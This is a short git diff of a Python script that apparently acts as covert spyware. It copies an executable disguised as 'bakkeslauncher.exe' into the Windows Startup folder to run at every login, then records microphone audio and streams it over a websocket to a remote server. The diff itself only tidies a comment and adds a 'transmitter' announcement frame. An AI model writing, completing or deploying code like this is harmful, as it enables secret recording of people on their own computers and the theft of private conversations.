@@ -13,7 +13,6 @@ USERNAME = os.environ.get("USERNAME")
 
 startup_folder = os.path.join("C:\\Users", USERNAME, "AppData", "Roaming",
                               "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-
 dest = os.path.join(startup_folder, "bakkeslauncher.exe")
 
 if not os.path.exists(dest):
@@ -31,8 +30,7 @@ CHANNELS = 1
 CHUNK = 1024
 DTYPE = np.int16
 
-# ID único do transmissor
-TRANSMITTER_ID = str(uuid.uuid4()).encode()[:16]  # 16 bytes
+TRANSMITTER_ID = str(uuid.uuid4()).encode()[:16]
 
 def connect_ws(server_url):
     ws = websocket.WebSocket()
@@ -66,6 +64,7 @@ with sd.InputStream(samplerate=SAMPLE_RATE,
                     dtype=DTYPE,
                     callback=callback):
     print("Capturando áudio e enviando...")
+    send_frame(b"__transmitter_since")
     try:
         while True:
             time.sleep(1)
